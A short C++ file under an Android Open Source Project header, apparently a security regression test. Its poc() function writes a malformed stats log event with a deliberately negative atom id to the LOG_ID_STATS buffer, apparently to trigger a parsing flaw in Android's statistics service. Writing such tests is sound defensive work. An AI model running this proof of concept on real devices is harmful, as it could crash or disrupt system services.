/**
 * Copyright (C) 2021 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <log/log.h>
#include <stats_event_list.h>
#include <utils/SystemClock.h>

const static int kStatsEventTag = 1937006964;

void poc() {
    stats_event_list event(kStatsEventTag);
    event << android::elapsedRealtimeNano();
    event << -1338885832; // Negative atom id.
    event.write(LOG_ID_STATS);
}

int main(int /* argc */, char** /* argv */) {
    poc();
    return 0;
}